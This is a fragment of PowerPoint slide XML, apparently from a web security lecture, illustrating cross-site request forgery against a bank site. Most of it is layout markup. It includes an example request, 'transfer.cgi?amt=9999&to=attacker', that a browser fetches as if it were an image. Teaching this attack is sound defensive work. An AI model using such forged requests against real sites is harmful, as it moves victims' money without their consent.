                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPts val="1588"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>transfer.cgi?amt=9999&amp;to=attacker”&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85008" name="object 26"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2196353" y="5104280"/>
            <a:ext cx="3308537" cy="1426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12700">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="101000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2294" b="1">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Browser automatically  visits the URL to obtain  what it believes will be  an image</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2294">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85009" name="object 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8517872" y="4406713"/>
            <a:ext cx="1881187" cy="1495985"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId7"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85010" name="object 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8533279" y="4437530"/>
            <a:ext cx="1809750" cy="1420346"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId6"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85011" name="object 12"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8533279" y="4437530"/>
            <a:ext cx="1809750" cy="1420346"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 2586990"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 7803 w 2586990"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 7803 w 2586990"/>
              <a:gd name="T5" fmla="*/ 28269 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 2586990"/>
              <a:gd name="T7" fmla="*/ 28269 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 2586990"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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86990" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2586685" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2586685" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="00D026">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85012" name="object 24"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8691563" y="4920784"/>
            <a:ext cx="1383926" cy="3590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11113">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2780"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>bank.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2118" b="1">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85013" name="object 22"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="780000">
            <a:off x="4675655" y="4751330"/>
            <a:ext cx="3353360" cy="243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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="1887"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:hlinkClick r:id="rId8"/>
              </a:rPr>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:hlinkClick r:id="rId8"/>
              </a:rPr>
              <a:t>HabibB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:hlinkClick r:id="rId8"/>
              </a:rPr>
              <a:t>ank.com/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588" b="1">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85014" name="object 23"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="780000">
            <a:off x="3952875" y="4990264"/>
            <a:ext cx="4391306"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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
